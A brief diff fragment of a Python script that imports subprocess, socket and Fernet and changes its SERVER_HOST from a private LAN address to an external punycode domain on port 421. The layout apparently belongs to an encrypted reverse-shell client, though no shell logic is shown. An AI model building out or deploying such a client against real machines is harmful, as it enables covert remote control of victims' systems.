@@ -2,7 +2,7 @@ import os, subprocess, socket
 from cryptography.fernet import Fernet
 
 
-SERVER_HOST = '192.168.3.149'  #'xn--6pw65a019d.xyz'
+SERVER_HOST = 'xn--6pw65a019d.xyz'
 SERVER_PORT = 421
 BUFFER_SIZE = 1024 * 128 
 SEPARATOR = "<sep>"
